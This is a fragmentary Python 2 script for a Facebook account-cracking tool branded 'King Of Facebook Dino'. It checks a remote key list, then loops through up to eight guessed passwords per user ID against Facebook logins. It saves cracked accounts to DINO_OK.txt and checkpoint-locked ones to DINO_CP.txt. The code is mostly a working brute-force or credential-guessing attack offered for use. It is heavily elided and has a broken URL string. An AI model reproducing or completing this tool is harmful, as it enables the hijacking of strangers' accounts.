...
def reg():
    ...
    r = requests.get('https://rawgithubusercontent.com/DINO786/zer/edit/main/txt).text
    if to in r:
...
def menu_s():
    ...
    if ms == '1':
        ...
        os.system('python2 raes shah dino baloch.py')
        time.sleep(1)
    elif ms == '3':
        v_tok()
    elif ms == '4':
...
def a_s():
    ...
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mKing Of Facebook Dino\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[DINO-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/DINO_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[DINO-CP] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[DINO-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/DINO_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[DINO-CP] ' + uid + ' | ' + pass2
                    cp = open('DINO_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[DINO-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/DINO_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[DINO-CP] ' + uid + ' | ' + pass3
                        cp = open('DINO_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[DINO-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/DINO_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[DINO-CP] ' + uid + ' | ' + pass4
                            cp = open('DINO_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[DINO-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/DINO_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[DINO-CP] ' + uid + ' | ' + pass5
                                cp = open('DINO_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[DINO-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/DINO_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[DINO-CP] ' + uid + ' | ' + pass6
                                    cp = open('DINO_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[DINO-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/DINO_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[DINO-CP] ' + uid + ' | ' + pass7
                                        cp = open('DINO_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[DINO-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/DINO_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[DINO-CP] ' + uid + ' | ' + pass8
                                            cp = open('DINO_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
